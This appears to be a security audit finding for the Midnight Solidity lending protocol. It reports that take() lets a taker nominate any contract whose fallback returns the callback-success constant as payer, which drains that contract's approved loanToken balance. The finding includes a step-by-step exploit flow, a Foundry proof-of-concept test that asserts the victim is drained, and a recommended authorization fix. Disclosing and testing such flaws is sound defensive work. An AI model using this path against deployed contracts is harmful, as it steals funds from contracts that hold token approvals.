### Title
Fallback-returning-CALLBACK_SUCCESS contract drained as takerCallback payer in take() - (File: src/Midnight.sol)

### Summary
When taking a sell offer (`offer.buy = false`), the taker-supplied `takerCallback` is assigned as both `buyerCallback` and `payer`. The protocol's sole guard before pulling tokens from `payer` is that `IBuyCallback(takerCallback).onBuy(...)` returns `CALLBACK_SUCCESS` (`keccak256("morpho.midnight.callbackSuccess")`). A contract lacking an explicit `onBuy` function but possessing a `fallback()` that returns this exact bytes32 value passes the check, enabling an attacker to designate any such contract as payer and drain its loanToken allowance to Midnight.

### Finding Description
**Code path** (`src/Midnight.sol`, lines 420–456):

```
// sell offer: offer.buy == false
address buyerCallback = offer.buy ? offer.callback : takerCallback;   // = takerCallback (attacker-set)
address payer        = buyerCallback != address(0) ? buyerCallback    // = takerCallback = victimContract
                     : (offer.buy ? buyer : msg.sender);

// Guard: only checks return value, not identity of caller
require(
    IBuyCallback(buyerCallback)
        .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
    == CALLBACK_SUCCESS,                                               // keccak256("morpho.midnight.callbackSuccess")
    WrongBuyCallbackReturnValue()
);

// Tokens pulled from payer = victimContract
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**Root cause**: `take()` imposes no constraint that `takerCallback` must be the taker, authorized by the taker, or a contract that deliberately opted in as payer. The only enforcement is the return-value check. Because Solidity dispatches unrecognized selectors to `fallback()`, any contract whose `fallback()` returns `CALLBACK_SUCCESS` satisfies the check and becomes the payer.

**Attacker inputs**:
- A valid sell offer ratified by `EcrecoverRatifier` (maker's signature, standard Merkle proof).
- `takerCallback = victimContract` where `victimContract` has `fallback() external returns (bytes32) { return keccak256("morpho.midnight.callbackSuccess"); }` and has approved `loanToken` to Midnight.

**Exploit flow**:
1. Attacker calls `take(sellOffer, ratifierData, units, attacker, receiver, victimContract, "")`.
2. `buyerCallback = victimContract`, `payer = victimContract`.
3. `IBuyCallback(victimContract).onBuy(...)` dispatches to `victimContract`'s `fallback()`.
4. `fallback()` returns `CALLBACK_SUCCESS`; `require` passes.
5. `safeTransferFrom(loanToken, victimContract, address(this), buyerAssets - sellerAssets)` and `safeTransferFrom(loanToken, victimContract, receiver, sellerAssets)` execute, draining `victimContract`'s approved balance.

**Why existing checks fail**:
- `taker == msg.sender || isAuthorized[taker][msg.sender]` — checks taker identity, not `takerCallback`.
- `isAuthorized[offer.maker][offer.ratifier]` + `EcrecoverRatifier.isRatified` — validates the offer's maker signature; irrelevant to `takerCallback`.
- `require(... == CALLBACK_SUCCESS)` — the only guard, and it is satisfied by a fallback returning the constant. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
**Case (a) — no fallback**: `IBuyCallback(victimContract).onBuy(...)` reverts; `take()` reverts with `WrongBuyCallbackReturnValue`. No drain. Absence of `onBuy` with no fallback is sufficient protection.

**Case (b) — fallback returning `CALLBACK_SUCCESS`**: The check passes. `payer = victimContract`. Both `safeTransferFrom` calls execute against `victimContract`'s allowance. Full `buyerAssets` (up to the offer's `maxUnits`/`maxAssets`) are drained from `victimContract` to Midnight and to `receiver` (attacker-controlled). This is a direct, complete token loss for `victimContract`.

**Case (c) — fallback returning wrong value**: `require` fails; `take()` reverts. No drain.

Only case (b) is exploitable. The invariant "only the explicit payer that returned CALLBACK_SUCCESS can lose tokens" is technically upheld by the Certora spec, but the spec does not constrain who the taker may nominate as `takerCallback`, leaving the payer-confusion path open. [4](#0-3) [5](#0-4) 

### Likelihood Explanation
**Preconditions**:
1. `victimContract` has a `fallback()` returning `keccak256("morpho.midnight.callbackSuccess")` — not accidental; requires deliberate coding of this specific 32-byte constant. Realistic for "universal adapter" or "pass-through" contracts that return a fixed magic value.
2. `victimContract` has approved `loanToken` to Midnight — common for any contract that interacts with the protocol (e.g., a lending aggregator, a router, a vault wrapper).
3. Attacker has access to a valid sell offer (EcrecoverRatifier-signed) — freely obtainable from any maker who has published a signed offer.

Likelihood is **low-to-medium**: condition 1 is non-trivial but not impossible; condition 2 is routine. The attack is repeatable and permissionless once both conditions hold.

### Recommendation
Add an authorization check that `takerCallback` must be the taker or explicitly authorized by the taker before it can be used as payer:

```solidity
require(
    takerCallback == address(0)
    || takerCallback == taker
    || isAuthorized[taker][takerCallback],
    TakerCallbackUnauthorized()
);
```

Place this check immediately after the `TakerUnauthorized` check at line 346. This mirrors the existing authorization model used for `taker` itself and closes the payer-confusion path without changing the callback flow for legitimate use cases. [6](#0-5) 

### Proof of Concept
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.34;

import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";

/// Case (b): fallback returns CALLBACK_SUCCESS — should drain victimContract
contract FallbackCallbackSuccess {
    fallback() external returns (bytes32) {
        return CALLBACK_SUCCESS; // keccak256("morpho.midnight.callbackSuccess")
    }
}

/// Case (a): no fallback — should revert
contract NoFallback {}

/// Case (c): fallback returns wrong value — should revert
contract FallbackWrongValue {
    fallback() external returns (bytes32) {
        return bytes32(0);
    }
}

contract PayerConfusionTest is BaseTest {
    function testCaseA_NoFallbackReverts() public {
        address victim = address(new NoFallback());
        deal(address(loanToken), victim, 1e18);
        vm.prank(victim); loanToken.approve(address(midnight), type(uint256).max);

        vm.expectRevert(); // WrongBuyCallbackReturnValue or low-level revert
        vm.prank(attacker);
        midnight.take(sellOffer, ratifierData, units, attacker, attacker, victim, "");
    }

    function testCaseB_FallbackCallbackSuccessDrains() public {
        address victim = address(new FallbackCallbackSuccess());
        deal(address(loanToken), victim, 1e18);
        vm.prank(victim); loanToken.approve(address(midnight), type(uint256).max);

        uint256 balBefore = loanToken.balanceOf(victim);
        vm.prank(attacker);
        midnight.take(sellOffer, ratifierData, units, attacker, attacker, victim, "");
        uint256 balAfter = loanToken.balanceOf(victim);

        assertLt(balAfter, balBefore, "victim drained");
        // assert attacker or receiver received sellerAssets
    }

    function testCaseC_FallbackWrongValueReverts() public {
        address victim = address(new FallbackWrongValue());
        deal(address(loanToken), victim, 1e18);
        vm.prank(victim); loanToken.approve(address(midnight), type(uint256).max);

        vm.expectRevert(IMidnight.WrongBuyCallbackReturnValue.selector);
        vm.prank(attacker);
        midnight.take(sellOffer, ratifierData, units, attacker, attacker, victim, "");
    }
}
```

Expected assertions: only case (b) succeeds and `balAfter < balBefore`; cases (a) and (c) revert. [7](#0-6) [8](#0-7) [2](#0-1)

### Citations

**File:** src/Midnight.sol (L346-346)
```text
        require(taker == msg.sender || isAuthorized[taker][msg.sender], TakerUnauthorized());
```

**File:** src/Midnight.sol (L420-456)
```text
        address buyerCallback = offer.buy ? offer.callback : takerCallback;
        address sellerCallback = offer.buy ? takerCallback : offer.callback;
        address payer = buyerCallback != address(0) ? buyerCallback : (offer.buy ? buyer : msg.sender);
        address receiver = offer.buy ? receiverIfTakerIsSeller : offer.receiverIfMakerIsSeller;

        emit EventsLib.Take(
            msg.sender,
            id,
            units,
            taker,
            offer.maker,
            offer.buy,
            offer.group,
            buyerAssets,
            sellerAssets,
            newConsumed,
            buyerPendingFeeIncrease,
            sellerPendingFeeDecrease,
            buyerCreditIncrease,
            sellerCreditDecrease,
            receiver,
            payer
        );

        bool wasLocked = UtilsLib.tExchange(LIQUIDATION_LOCK_SLOT, id, seller, true);
        if (buyerCallback != address(0)) {
            bytes memory buyerCallbackData = offer.buy ? offer.callbackData : takerCallbackData;
            require(
                IBuyCallback(buyerCallback)
                    .onBuy(id, offer.market, buyerAssets, units, buyerPendingFeeIncrease, buyer, buyerCallbackData)
                == CALLBACK_SUCCESS,
                WrongBuyCallbackReturnValue()
            );
        }

        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, address(this), buyerAssets - sellerAssets);
        SafeTransferLib.safeTransferFrom(offer.market.loanToken, payer, receiver, sellerAssets);
```

**File:** src/libraries/ConstantsLib.sol (L25-25)
```text
bytes32 constant CALLBACK_SUCCESS = keccak256("morpho.midnight.callbackSuccess");
```

**File:** src/interfaces/ICallbacks.sol (L8-10)
```text
interface IBuyCallback {
    function onBuy(bytes32 id, Market memory market, uint256 buyerAssets, uint256 units, uint256 pendingFeeIncrease, address buyer, bytes memory data) external returns (bytes32);
}
```

**File:** certora/specs/OnlyExplicitPayerCanLoseTokens.spec (L91-115)
```text
/// Proves that in `take`, the only addresses whose tokens can be pulled are:
/// 1. msg.sender (when !offer.buy and buyerCallback == 0),
/// 2. the buyerCallback that returned CALLBACK_SUCCESS,
/// 3. the offer maker (when offer.buy and buyerCallback == 0, i.e. maker is the buyer with no callback).
rule takeOnlyExplicitPayer(env e, Midnight.Offer offer, bytes ratifierData, uint256 units, address taker, address receiverIfTakerIsSeller, address takerCallback, bytes takerCallbackData) {
    require e.msg.sender != currentContract, "only external calls";

    address buyerCallback = offer.buy ? offer.callback : takerCallback;

    msgSender = e.msg.sender;
    msgSenderAllowed = !offer.buy && buyerCallback == 0;
    callbackAllowed = false;
    maker = offer.maker;
    makerAllowed = offer.buy && buyerCallback == 0;

    buyCallbackAllowed = true;
    liquidateCallbackAllowed = false;
    repayCallbackAllowed = false;
    flashLoanCallbackAllowed = false;
    badPullSeen = false;

    take(e, offer, ratifierData, units, taker, receiverIfTakerIsSeller, takerCallback, takerCallbackData);

    assert !badPullSeen;
}
```
